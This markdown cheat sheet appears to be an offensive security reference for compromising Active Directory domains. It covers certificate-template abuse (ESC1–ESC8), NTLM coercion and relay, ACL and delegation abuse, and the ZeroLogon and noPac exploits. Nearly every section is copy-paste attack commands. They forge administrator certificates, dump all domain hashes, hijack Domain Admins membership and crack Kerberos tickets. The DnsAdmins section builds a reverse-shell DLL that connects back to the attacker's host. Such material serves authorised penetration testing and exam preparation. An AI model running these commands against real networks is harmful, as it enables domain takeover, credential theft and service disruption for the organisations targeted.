# AD CS — Active Directory Certificate Services — [Back to AD](ad_main.md)

If ADCS is present (port 80 on `certsrv` endpoint, or port 443), this is frequently the intended privilege escalation or lateral movement path.

```bash
# Quick check — is ADCS running?
nxc smb $DC_IP -u user -p 'password' -M adcs
curl -k http://$DC_IP/certsrv/   # HTTP enrollment = ESC8 candidate
```

> **certipy username format:** always `user@DOMAIN` (UPN with `@`), not `DOMAIN/user`.

---

## Enumerate with certipy

> **Kali Linux:** `certipy` is installed as `certipy-ad` — substitute `certipy-ad` for `certipy` in all commands below.

```bash
# Find all vulnerable templates and misconfigurations
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -stdout -vulnerable

# Output to files (JSON + text) for review
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP
```

Look for: `ESC1`, `ESC2`, `ESC4`, `ESC6`, `ESC7`, `ESC8` in output.

---

## ESC1 — Enrollee Supplies SAN

**Condition:** Template allows the enrollee to specify a Subject Alternative Name (SAN). Enroll as any user including DA.

```bash
# Enumerate — look for: "Client Authentication" EKU + "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -stdout -vulnerable

# Request cert as administrator (or any target user)
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -target ca.$DOMAIN \
  -ca '<CA-NAME>' \
  -template '<VulnerableTemplate>' \
  -upn administrator@$DOMAIN

# Authenticate with cert — get NTLM hash + TGT
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# Use hash for PTH / secretsdump
impacket-secretsdump -hashes :NTLM_HASH $DOMAIN/administrator@$DC_IP
```

---

## ESC2 — Any Purpose EKU

**Condition:** Certificate has "Any Purpose" or no EKU — can be used for client auth.

Same exploitation as ESC1 — request cert, use for authentication:
```bash
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -target ca.$DOMAIN -ca '<CA-NAME>' -template '<ESC2Template>' \
  -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

---

## ESC4 — Vulnerable Template ACL

**Condition:** Low-priv user has write rights over a certificate template — modify it to be vulnerable like ESC1.

```bash
# Overwrite template to be vulnerable (saves original config)
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template '<TargetTemplate>' -save-old

# Now exploit as ESC1
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -target ca.$DOMAIN -ca '<CA-NAME>' -template '<TargetTemplate>' \
  -upn administrator@$DOMAIN

# Restore original template after
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template '<TargetTemplate>' -configuration '<TargetTemplate>.json'
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

**Condition:** CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — any template with client auth EKU can have a SAN specified by enrollee.

```bash
# Exploit any enrollable client-auth template as ESC1
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -target ca.$DOMAIN -ca '<CA-NAME>' -template 'User' \
  -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

---

## ESC8 — NTLM Relay to ADCS HTTP Enrollment

**Condition:** ADCS HTTP enrollment endpoint (not HTTPS, or HTTPS without EPA). Relay authentication from any host to get a certificate issued as that host's machine account. Combine with coercion on DC → get DC cert → DCSync.

```bash
# Step 1: start relay targeting ADCS enrollment endpoint
impacket-ntlmrelayx -t http://ca.$DOMAIN/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: coerce DC to authenticate to LHOST (see Coercion section)
python3 PetitPotam.py -u '' -p '' $LHOST $DC_IP       # unauthenticated (older DCs)
coercer coerce -t $DC_IP -l $LHOST -u user -p 'password' -d $DOMAIN  # authenticated

# ntlmrelayx outputs a base64 certificate
# Step 3: decode cert and authenticate as DC
echo '<base64_cert>' | base64 -d > dc.pfx
certipy auth -pfx dc.pfx -dc-ip $DC_IP -username '<DC$>' -domain $DOMAIN

# Step 4: DCSync with DC machine account hash
impacket-secretsdump -hashes :DC_NTLM_HASH $DOMAIN/'DC$'@$DC_IP
```

---

## Coercion Attacks

Force a machine (especially DCs) to authenticate to you for relay or hash capture.

```bash
# PetitPotam (MS-EFSRPC) — unauthenticated on older/unpatched DCs
python3 PetitPotam.py $LHOST $DC_IP
python3 PetitPotam.py -u '' -p '' $LHOST $DC_IP

# Coercer — tries all available coercion methods (requires creds)
coercer coerce -t $DC_IP -l $LHOST -u user -p 'password' -d $DOMAIN
coercer scan -t $DC_IP -u user -p 'password' -d $DOMAIN    # just check what's available

# PrinterBug / SpoolSample (MS-RPRN — requires print spooler on target)
python3 printerbug.py $DOMAIN/user:'password'@$DC_IP $LHOST

# Combine with Responder (capture NTLMv2) or ntlmrelayx (relay to SMB/LDAP/ADCS)
responder -I eth0 -wd   # capture mode
# or:
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## ACL / ACE Abuse

BloodHound identifies these edges. Each represents a privilege that can be escalated.

```bash
# bloodyAD — best tool for ACL abuse from Linux
# Install: pip3 install bloodyAD
```

### GenericAll / GenericWrite on User

```bash
# Option A: Force password change
bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p 'password' set password targetuser 'NewPassword123!'
net rpc password targetuser 'NewPassword123!' -U "$DOMAIN/attacker%password" -S $DC_IP

# Option B: Targeted Kerberoasting (set SPN, roast, crack, remove)
bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p 'password' \
  set object targetuser servicePrincipalName -v 'fake/spn.domain.local'
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/attacker:'password' -request -outputfile krb.txt
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
# Clean up:
bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p 'password' \
  remove object targetuser servicePrincipalName
```

### GenericAll / GenericWrite on Computer

```bash
# RBCD — configure computer to allow attacker to impersonate any user to it
# Create a machine account (if MachineAccountQuota > 0)
impacket-addcomputer $DOMAIN/attacker:'password' -dc-ip $DC_IP \
  -computer-name 'FAKE$' -computer-pass 'FakePass123!'

# Set RBCD: allow FAKE$ to impersonate users to TARGET$
impacket-rbcd -dc-ip $DC_IP -action write -delegate-to 'TARGET$' \
  -delegate-from 'FAKE$' "$DOMAIN/attacker:password"

# Impersonate administrator to TARGET$
impacket-getST -dc-ip $DC_IP -spn cifs/target.$DOMAIN \
  -impersonate administrator "$DOMAIN/FAKE\$:FakePass123!"
export KRB5CCNAME=administrator@cifs_target.$DOMAIN.ccache
impacket-psexec -k -no-pass $DOMAIN/administrator@target.$DOMAIN
```

### GenericAll on Group / AddMember

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p 'password' \
  add groupMember "Domain Admins" attacker
net rpc group addmem "Domain Admins" attacker -U "$DOMAIN/attacker%password" -S $DC_IP
```

### ForceChangePassword

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p 'password' \
  set password targetuser 'NewPassword123!'
net rpc password targetuser 'NewPassword123!' -U "$DOMAIN/attacker%password" -S $DC_IP
```

### WriteDACL on Domain Object → DCSync

```bash
# Grant yourself DCSync rights
impacket-dacledit -dc-ip $DC_IP -action write -rights DCSync \
  -principal attacker \
  -target-dn "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \
  "$DOMAIN/attacker:password"

# DCSync
impacket-secretsdump -dc-ip $DC_IP $DOMAIN/attacker:'password'@$DC_IP -just-dc-ntlm
```

### WriteOwner → Escalate to GenericAll

```bash
# Take ownership of target object
impacket-owneredit -dc-ip $DC_IP -action write -new-owner attacker \
  -target targetuser "$DOMAIN/attacker:password"

# Grant yourself full control
impacket-dacledit -dc-ip $DC_IP -action write -rights FullControl \
  -principal attacker -target targetuser "$DOMAIN/attacker:password"

# Now exploit as GenericAll (above)
```

---

## Delegation Attacks

### Unconstrained Delegation

Any machine with unconstrained delegation caches TGTs from users authenticating to it.

```bash
# Find machines with unconstrained delegation (excluding DCs — they always have it)
nxc ldap $DC_IP -u user -p 'password' --trusted-for-delegation

# If you have local admin on the unconstrained host — monitor for TGTs
# Upload Rubeus to the host:
.\Rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap   # wait for DC$ TGT

# Trigger DC auth to unconstrained host using coercion
coercer coerce -t $DC_IP -l <unconstrained_host_ip> -u user -p 'password' -d $DOMAIN

# Captured TGT: inject and use
.\Rubeus.exe ptt /ticket:<base64_ticket>
# Now impersonating DC — run secretsdump
impacket-secretsdump -k -no-pass $DOMAIN/DC\$@$DC_IP
```

### Constrained Delegation (with Protocol Transition)

```bash
# Find constrained delegation accounts
nxc ldap $DC_IP -u user -p 'password' --trusted-for-delegation
# Or: ldapsearch for msDS-AllowedToDelegateTo attribute

# S4U2Self + S4U2Proxy: impersonate any user to allowed service
impacket-getST -dc-ip $DC_IP \
  -spn <allowed_spn/target.$DOMAIN> \
  -impersonate administrator \
  "$DOMAIN/svcaccount:password"

export KRB5CCNAME=administrator@<spn>.ccache
impacket-psexec -k -no-pass $DOMAIN/administrator@target.$DOMAIN
```

---

## DnsAdmins → SYSTEM on DC

If user is in `DnsAdmins` group, they can load a DLL into the DNS service (runs as SYSTEM on DC).

```bash
# Create DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -f dll -o evil.dll

# Serve DLL via SMB
impacket-smbserver -smb2support share $(pwd)

# Configure DNS plugin (on target with dnscmd access, or via nxc)
nxc smb $DC_IP -u dnsadmin -p 'password' -x 'dnscmd /config /serverlevelplugindll \\$LHOST\share\evil.dll'

# Restart DNS service
nxc smb $DC_IP -u dnsadmin -p 'password' -x 'sc stop dns'
nxc smb $DC_IP -u dnsadmin -p 'password' -x 'sc start dns'

# Start listener on LHOST before restarting
rlwrap nc -lvnp $LPORT
```

---

## ZeroLogon (CVE-2020-1472)

**Unauthenticated** — resets DC machine account password to empty. Gives immediate domain compromise.

> **PT ONLY in production** — breaks AD replication until restored. Safe to use in labs/exam.

```bash
# Check
nxc smb $DC_IP -u '' -p '' -M zerologon

# Exploit
python3 cve-2020-1472-exploit.py <DC_NETBIOS_NAME> $DC_IP

# Dump all domain hashes
impacket-secretsdump -no-pass -just-dc "$DOMAIN/<DC_NETBIOS_NAME>\$@$DC_IP"

# Restore DC machine account password (do this immediately after)
# Get original hash from dumped secrets first, then:
python3 restorepassword.py "$DOMAIN/<DC_NETBIOS_NAME>@$DC_IP" \
  -target-ip $DC_IP -hexpass <original_hex_password>
```

> PoC: [dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

---

## noPac (CVE-2021-42278 + CVE-2021-42287)

**Requires any valid domain user** — exploits machine account naming + PAC to forge DA ticket.

```bash
# Check
nxc smb $DC_IP -u user -p 'password' -M nopac

# Exploit — drops shell as SYSTEM on DC
python3 noPac.py $DOMAIN/user:'password' \
  -dc-ip $DC_IP -dc-host <DC_HOSTNAME> \
  --impersonate administrator -shell

# Or dump creds directly
python3 noPac.py $DOMAIN/user:'password' \
  -dc-ip $DC_IP -dc-host <DC_HOSTNAME> \
  --impersonate administrator -dump -just-dc-user "$DOMAIN/administrator"
```

> PoC: [Ridter/noPac](https://github.com/Ridter/noPac)
